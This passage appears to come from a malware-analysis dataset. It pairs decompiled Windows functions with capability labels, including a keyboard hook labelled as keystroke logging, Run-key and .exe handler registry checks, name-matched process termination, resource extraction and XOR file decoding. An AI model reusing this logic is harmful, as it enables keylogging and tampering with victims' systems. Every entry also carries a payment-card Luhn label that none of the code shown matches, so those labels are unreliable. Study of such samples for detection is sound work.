        "decompiled_code": "\nuint fcn.00401540(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint arg_8h;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t hKey;\n    \n    arg_8h = fcn.00420e6f(0);\n    fcn.00420c64(arg_8h);\n    pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExA;\n    iVar5 = 0;\n    do {\n        (*pcVar1)(0x80000001, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, 0x20019, &hKey);\n        if (hKey != 0) {\n            iVar3 = (*pcVar2)(hKey, *(iVar5 * 4 + 0x444ac0), 0, 0, 0, 0);\n            if (iVar3 == 0) {\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                return *(iVar5 * 4 + 0x444ac0);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 8);\n    uVar4 = fcn.00420c76();\n    uVar4 = uVar4 & 0x80000007;\n    if (uVar4 < 0) {\n        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n    }\n    return *(uVar4 * 4 + 0x444ac0);\n}\n",
        "token_count": 392
    },
    "004016b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004016b0(int32_t arg_8h)\n\n{\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    code *var_1ch;\n    char *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437db4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00420756(0);\n    *(arg_8h + 4) = 0;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 0;\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x1c) = 0;\n    *(arg_8h + 0x20) = 0;\n    var_4h = 4;\n    if (unaff_EDI == 0) {\n        var_10h = \"bad locale name\";\n        fcn.00421094(&var_10h);\n        var_1ch = vtable.std::runtime_error.0;\n        fcn.00424181(&var_1ch, 0x43f7e8);\n    }\n    fcn.004204a0(arg_8h, unaff_EDI);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 371
    },
    "00401750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401750(int32_t arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x437d24;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 4;\n    fcn.0042042d(arg_8h);\n    if (*(arg_8h + 0x1c) != 0) {\n        fcn.004214f1(*(arg_8h + 0x1c));\n    }\n    *(arg_8h + 0x1c) = 0;\n    if (*(arg_8h + 0x14) != 0) {\n        fcn.004214f1(*(arg_8h + 0x14));\n    }\n    *(arg_8h + 0x14) = 0;\n    if (*(arg_8h + 0xc) != 0) {\n        fcn.004214f1(*(arg_8h + 0xc));\n    }\n    *(arg_8h + 0xc) = 0;\n    if (*(arg_8h + 4) != 0) {\n        fcn.004214f1(*(arg_8h + 4));\n    }\n    *(arg_8h + 4) = 0;\n    var_4h = 0xffffffff;\n    fcn.0042077e();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 348
    },
    "00401f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "write file on Windows",
            "read file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00401f50(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint32_t arg_8h_00;\n    int32_t arg_14h;\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint var_1h;\n    \n    uVar2 = 0;\n    arg_8h_00 = fcn.00421d73(in_EAX, 0x43c2fc);\n    if (arg_8h_00 != 0) {\n        arg_14h = fcn.00421d73(arg_8h, 0x43c304);\n        uVar2 = 0;\n        if (arg_14h != 0) {\n            iVar1 = fcn.00420fbc(arg_8h_00);\n            while (iVar1 == 0) {\n                fcn.004220ca(&var_1h, 1, 1, arg_8h_00);\n                fcn.004222be(&var_1h, 1, 1, arg_14h);\n                iVar1 = fcn.00420fbc(arg_8h_00);\n            }\n            uVar2 = 1;\n            fcn.004226f5(arg_14h);\n        }\n        arg_8h_00 = fcn.004226f5(arg_8h_00);\n    }\n    return arg_8h_00 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 343
    },
    "00402150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402150(uint *param_1)\n\n{\n    if (0xf < param_1[5]) {\n        fcn.004220e7(*param_1);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "00402220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00402220(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar6;\n    int32_t *var_8h;\n    uint var_ch_3;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4380c0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_8h[2] = 0;\n    var_8h[3] = 0;\n    piVar2 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    var_14h = 0;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 4))();\n    }\n    var_4h = 0;\n    cVar5 = fcn.00403530();\n    if (cVar5 != '\\0') {\n        var_4h = 2;\n        iVar6 = (**(**(*(*var_8h + 4) + 0x38 + var_8h) + 0x20))(var_ch_3, var_10h_2, var_14h_2);\n        puVar1 = var_8h + 2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + iVar6;\n        var_8h[3] = var_8h[3] + (iVar6 >> 0x20) + CARRY4(uVar3, iVar6);\n        if (iVar6 != CONCAT44(var_14h_2, var_10h_2)) {\n            var_14h = 3;\n        }\n    }\n    var_4h = 1;\n    iVar4 = *(*var_8h + 4);\n    if (var_14h != 0) {\n        var_14h = *(var_8h + iVar4 + 0xc) | var_14h;\n        if (*(var_8h + iVar4 + 0x38) == 0) {\n            var_14h = var_14h | 4;\n        }\n        *(var_8h + iVar4 + 0xc) = var_14h & 0x17;\n        if ((*(var_8h + iVar4 + 0x10) & var_14h & 0x17) != 0) {\n            fcn.00401b60(0);\n        }\n    }\n    var_4h = 0xffffffff;\n    piVar2 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 761
    },
    "004034a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004034a0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.0042068e(\"invalid string position\");\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.00421190(ppiVar4 + arg_8h, ppiVar1 + arg_8h + arg_ch, uVar3 - arg_ch);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "00403700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403700(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x54) == 0) {\n        iVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00403830();\n        iVar4 = in_EAX;\n        if (cVar2 == '\\0') {\n            iVar4 = 0;\n        }\n        iVar3 = fcn.004226f5(*(in_EAX + 0x54));\n        if (iVar3 != 0) {\n            iVar4 = 0;\n        }\n    }\n    *(in_EAX + 0x10) = in_EAX + 8;\n    *(in_EAX + 0x20) = in_EAX + 0x18;\n    *(in_EAX + 0x24) = in_EAX + 0x1c;\n    *(in_EAX + 0x30) = in_EAX + 0x28;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x49) = 0;\n    *(in_EAX + 0x14) = in_EAX + 0xc;\n    *(in_EAX + 0x34) = in_EAX + 0x2c;\n    *(in_EAX + 0xc) = 0;\n    **(in_EAX + 0x24) = 0;\n    **(in_EAX + 0x34) = 0;\n    **(in_EAX + 0x10) = 0;\n    **(in_EAX + 0x20) = 0;\n    uVar1 = *0x444b5c;\n    **(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x4c) = uVar1;\n    *(in_EAX + 0x44) = 0;\n    return iVar4;\n}\n",
        "token_count": 474
    },
    "00403a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403a90(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    \n    iVar2 = **(in_EAX + 0x10);\n    iVar1 = in_EAX + 0x48;\n    if (iVar2 != iVar1) {\n        *(in_EAX + 0x3c) = iVar2;\n        *(in_EAX + 0x40) = **(in_EAX + 0x30) + **(in_EAX + 0x20);\n    }\n    **(in_EAX + 0x10) = iVar1;\n    **(in_EAX + 0x20) = iVar1;\n    **(in_EAX + 0x30) = (in_EAX - iVar1) + 0x49;\n    return;\n}\n",
        "token_count": 189
    },
    "00404910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404910(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_EDX;\n    uint unaff_EDI;\n    uint auStack20 [2];\n    uint uStack12;\n    \n    uStack12 = arg_8h;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)();\n    if (iVar1 != 0) {\n        iVar1 = fcn.00401db0(in_EDX);\n        if (iVar1 != 0) {\n            auStack20[0] = 0;\n            iVar2 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(auStack20, 0);\n            if (iVar2 == 0) {\n                fcn.00420c59(iVar1);\n                return 0;\n            }\n            uVar3 = fcn.004046c0(iVar1, unaff_EDI, &stack0xffffffe4);\n            fcn.00420c59(iVar1);\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 249
    },
    "00404bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00404bb0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint hLibModule;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.DLL_LoadLibraryExA)();\n    if (iVar2 == 0) {\n        return NULL;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.DLL_FindResourceA)(iVar2, 1, 3);\n    if (((iVar3 != 0) && (iVar4 = (*_sym.imp.KERNEL32.DLL_LoadResource)(iVar2, iVar3),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.DLL_LockResource)(iVar4),  iVar4 != 0)) {\n        iVar1 = *(iVar3 + 4);\n        puVar5 = fcn.0041ff97(iVar1);\n        if (iVar1 != 0) {\n            puVar6 = puVar5;\n            iVar7 = iVar1;\n            do {\n                *puVar6 = puVar6[iVar4 - puVar5];\n                puVar6 = puVar6 + 1;\n                iVar7 = iVar7 + -1;\n            } while (iVar7 != 0);\n        }\n        (*_sym.imp.KERNEL32.DLL_FreeResource)(iVar3);\n        (*_sym.imp.KERNEL32.DLL_FreeLibrary)(iVar2);\n        *arg_8h = iVar1;\n        return puVar5;\n    }\n    (*_sym.imp.KERNEL32.DLL_FreeLibrary)(iVar2);\n    return NULL;\n}\n",
        "token_count": 398
    },
    "00404cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404cb0(char *arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401db0(in_EAX);\n    pcVar4 = arg_8h;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar5 = pcVar4 - (arg_8h + 1);\n    iVar7 = -1;\n    iVar6 = 0;\n    if (0 < -1 - iVar5) {\n        do {\n            iVar7 = iVar6;\n            iVar6 = 0;\n            if (iVar5 < 1) goto code_r0x00404d19;\n            while (*(iVar2 + iVar7 + iVar6) == arg_8h[iVar6]) {\n                iVar6 = iVar6 + 1;\n                if (iVar5 <= iVar6) goto code_r0x00404d19;\n            }\n            iVar6 = iVar7 + 1;\n        } while (iVar7 + 1 < -1 - iVar5);\n        iVar7 = -1;\n    }\ncode_r0x00404d19:\n    uVar3 = fcn.00420c59(iVar2);\n    return uVar3 & 0xffffff00 | -1 < iVar7;\n}\n",
        "token_count": 361
    },
    "00404d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404d40(char *arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401db0(in_EAX);\n    pcVar3 = arg_8h;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar4 = pcVar3 - (arg_8h + 1);\n    iVar6 = -1;\n    iVar5 = 0;\n    if (0 < -1 - iVar4) {\n        do {\n            iVar6 = iVar5;\n            iVar5 = 0;\n            if (iVar4 < 1) goto code_r0x00404da9;\n            while (*(iVar2 + iVar6 + iVar5) == arg_8h[iVar5]) {\n                iVar5 = iVar5 + 1;\n                if (iVar4 <= iVar5) goto code_r0x00404da9;\n            }\n            iVar5 = iVar6 + 1;\n        } while (iVar6 + 1 < -1 - iVar4);\n        iVar6 = -1;\n    }\ncode_r0x00404da9:\n    fcn.00420c59(iVar2);\n    return iVar6;\n}\n",
        "token_count": 337
    },
    "00404dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404dc0(char *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_14h;\n    char *pcVar5;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00404d40(arg_8h);\n    if (0 < iVar2) {\n        iVar3 = fcn.00421d73(arg_ch, 0x43c2fc);\n        if (iVar3 == 0) {\n            iVar4 = 0;\n        }\n        else {\n            fcn.004225bb(iVar3, 0, 2);\n            iVar4 = fcn.004224cc(iVar3);\n            fcn.004226f5(iVar3);\n        }\n        if (iVar2 == iVar4) {\n            return 0;\n        }\n        cVar1 = fcn.00404f80(in_EAX, 0);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n    }\n    var_4h = 0;\n    iVar2 = fcn.00401db0(arg_ch);\n    iVar3 = fcn.00401db0(in_EAX);\n    var_8h = 0;\n    iVar4 = fcn.00404bb0(&var_8h);\n    arg_14h = fcn.00421d73(arg_10h, 0x43c304);\n    if (arg_14h == 0) {\n        if (iVar2 != 0) {\n            fcn.00420c59(iVar2);\n        }\n        if (iVar3 != 0) {\n            fcn.00420c59(iVar3);\n        }\n        if (iVar4 != 0) {\n            fcn.00420c59(iVar4);\n        }\n        return 0;\n    }\n    if (iVar2 != 0) {\n        fcn.004222be(iVar2, 1, var_4h, arg_14h);\n        fcn.00420c59(iVar2);\n    }\n    fcn.004226f5(arg_14h);\n    if (iVar4 != 0) {\n        fcn.00404c60(iVar4, var_8h);\n        fcn.00420c59(iVar4);\n    }\n    iVar2 = fcn.00421d73(arg_10h, 0x43c564);\n    if (iVar2 != 0) {\n        pcVar5 = arg_8h;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        fcn.004222be(arg_8h, 1, pcVar5 - (arg_8h + 1), iVar2);\n        if (iVar3 != 0) {\n            fcn.004222be(iVar3, 1, 0, iVar2);\n            fcn.00420c59(iVar3);\n        }\n        fcn.004226f5(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 731
    },
    "00405060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405060(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    iVar1 = fcn.004228ad(*unaff_ESI, unaff_ESI[1] + unaff_EDI);\n    *unaff_ESI = iVar1;\n    iVar1 = unaff_ESI[1];\n    if (iVar1 < iVar1 + unaff_EDI) {\n        arg_8h = arg_8h - iVar1;\n        do {\n            *(iVar1 + *unaff_ESI) = *(arg_8h + iVar1);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < unaff_ESI[1] + unaff_EDI);\n    }\n    unaff_ESI[1] = unaff_ESI[1] + unaff_EDI;\n    return;\n}\n",
        "token_count": 207
    },
    "004050a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004050a0(void)\n\n{\n    uint uVar1;\n    uint *unaff_ESI;\n    \n    uVar1 = fcn.00422819(1);\n    *unaff_ESI = uVar1;\n    unaff_ESI[1] = 0;\n    return;\n}\n",
        "token_count": 68
    },
    "004050e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    iVar1 = fcn.004228ad(*unaff_ESI, unaff_EDI + 1 + unaff_ESI[1]);\n    *unaff_ESI = iVar1;\n    iVar1 = unaff_ESI[1];\n    if (iVar1 < iVar1 + unaff_EDI) {\n        arg_8h = arg_8h - iVar1;\n        do {\n            *(iVar1 + *unaff_ESI) = *(arg_8h + iVar1);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < unaff_ESI[1] + unaff_EDI);\n    }\n    unaff_ESI[1] = unaff_ESI[1] + unaff_EDI;\n    *(unaff_ESI[1] + *unaff_ESI) = 0;\n    return;\n}\n",
        "token_count": 230
    },
    "004054a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054a0(uint8_t *arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *arg_8h_00;\n    uint var_134h;\n    uint var_12ch;\n    uint var_110h;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    arg_8h_00 = &var_134h;\n    var_134h = 0x128;\n    iVar4 = (*_sym.imp.KERNEL32.DLL_Process32First)();\n    pcVar3 = _sym.imp.KERNEL32.DLL_OpenProcess;\n    do {\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.DLL_CloseHandle)();\n            fcn.00420bc6(arg_8h_00);\n            return;\n        }\n        puVar5 = &var_110h;\n        do {\n            cVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n        } while (cVar1 != '\\0');\n        puVar6 = fcn.0041ff97(puVar5 + (1 - (&var_110h + 1)));\n        puVar5 = &var_110h;\n        iVar4 = puVar6 - puVar5;\n        do {\n            cVar1 = *puVar5;\n            *(iVar4 + puVar5) = cVar1;\n            puVar5 = puVar5 + 1;\n        } while (cVar1 != '\\0');\n        puVar7 = puVar6;\n        do {\n            uVar2 = *puVar7;\n            puVar7 = puVar7 + 1;\n        } while (uVar2 != 0);\n        iVar4 = 0;\n        puVar8 = puVar6;\n        puVar9 = arg_8h;\n        if (0 < puVar7 - (puVar6 + 1)) {\n            do {\n                uVar2 = puVar6[iVar4];\n                if (('@' < uVar2) && (uVar2 < '[')) {\n                    puVar6[iVar4] = uVar2 + 0x20;\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < puVar7 - (puVar6 + 1));\n        }\n        do {\n            uVar2 = *puVar8;\n            bVar10 = uVar2 < *puVar9;\n            if (uVar2 != *puVar9) {\ncode_r0x00405570:\n                iVar4 = (1 - bVar10) - (bVar10 != 0);\n                goto code_r0x00405575;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = puVar8[1];\n            bVar10 = uVar2 < puVar9[1];\n            if (uVar2 != puVar9[1]) goto code_r0x00405570;\n            puVar8 = puVar8 + 2;\n            puVar9 = puVar9 + 2;\n        } while (uVar2 != 0);\n        iVar4 = 0;\ncode_r0x00405575:\n        if ((iVar4 == 0) && (iVar4 = (*pcVar3)(1, 0, var_12ch),  iVar4 != 0)) {\n            (*_sym.imp.KERNEL32.DLL_TerminateProcess)(iVar4, 0);\n        }\n        fcn.00420c59(puVar6);\n        iVar4 = (*_sym.imp.KERNEL32.DLL_Process32Next)();\n    } while( true );\n}\n",
        "token_count": 869
    },
    "004055d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.004055d0(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_8h;\n    uint32_t hKey;\n    \n    bVar2 = false;\n    fcn.00429890();\n    (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n              (0x80000001, \"Software\\\\Classes\\\\.exe\\\\shell\\\\open\\\\command\", 0, 0x20019, &hKey);\n    if (hKey != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0, 0, 0);\n        bVar2 = iVar1 == 0;\n        hKey = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return hKey & 0xffffff00 | bVar2;\n}\n",
        "token_count": 196
    },
    "00406000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "write file on Windows",
            "read file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406000(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t arg_10h_00;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00421d73(in_EAX, 0x43c2fc);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004225bb(iVar1, 0, 2);\n    arg_10h_00 = fcn.004224cc(iVar1);\n    arg_8h_00 = fcn.0041ff97(arg_10h_00);\n    fcn.004225bb(iVar1, 0, 0);\n    iVar3 = 0;\n    if (0 < arg_10h_00) {\n        do {\n            iVar2 = fcn.00420fbc(iVar1);\n            if (iVar2 != 0) break;\n            fcn.004220ca(iVar3 + arg_8h_00, 1, 1, iVar1);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_10h_00);\n    }\n    fcn.004226f5(iVar1);\n    iVar1 = 0;\n    iVar3 = 0;\n    if (0 < arg_10h_00) {\n        do {\n            if (arg_10h <= iVar3) {\n                iVar3 = 0;\n            }\n            *(iVar1 + arg_8h_00) = *(iVar1 + arg_8h_00) ^ -*(iVar3 + arg_ch);\n            iVar1 = iVar1 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar1 < arg_10h_00);\n    }\n    iVar1 = fcn.00421d73(arg_8h, 0x43c304);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004222be(arg_8h_00, 1, arg_10h_00, iVar1);\n    fcn.004226f5(iVar1);\n    return 1;\n}\n",
        "token_count": 521
    },
    "00406280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406280(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    int32_t *unaff_ESI;\n    \n    uVar3 = arg_8h;\n    if (0x3fffffff < arg_8h) {\n        fcn.00420641(\"vector<T> too long\");\n        uVar3 = extraout_ECX;\n    }\n    if (unaff_ESI[2] - *unaff_ESI >> 2 < uVar3) {\n        arg_8h_00 = fcn.00406300();\n        fcn.00421190(arg_8h_00, *unaff_ESI, (unaff_ESI[1] - *unaff_ESI >> 2) * 4);\n        iVar1 = *unaff_ESI;\n        iVar2 = unaff_ESI[1];\n        if (iVar1 != 0) {\n            fcn.004220e7(iVar1);\n        }\n        *unaff_ESI = arg_8h_00;\n        unaff_ESI[2] = arg_8h_00 + arg_8h * 4;\n        unaff_ESI[1] = arg_8h_00 + (iVar2 - iVar1 >> 2) * 4;\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "00406300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406300(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    code *var_10h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if (param_1 != 0) {\n        if ((param_1 < 0x40000000) && (iVar1 = fcn.00422769(param_1 * 4),  iVar1 != 0)) {\n            return iVar1;\n        }\n        var_4h = 0;\n        fcn.00421094(&var_4h);\n        var_10h = vtable.std::bad_alloc.0;\n        iVar1 = fcn.00424181(&var_10h, 0x43f8b4);\n    }\n    return iVar1;\n}\n",
        "token_count": 178
    },
    "00409c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread",
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409c30(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00420e6f(0);\n    fcn.00420c64(uVar1);\n    uVar1 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xd, fcn.00409020, arg_8h, 0);\n    (*_sym.imp.KERNEL32.DLL_CreateThread)(0, 0, fcn.00409a40, 0, 0, 0);\n    fcn.004099f0();\n    (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(uVar1);\n    return 0;\n}\n",
        "token_count": 157
    },
    "00409e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
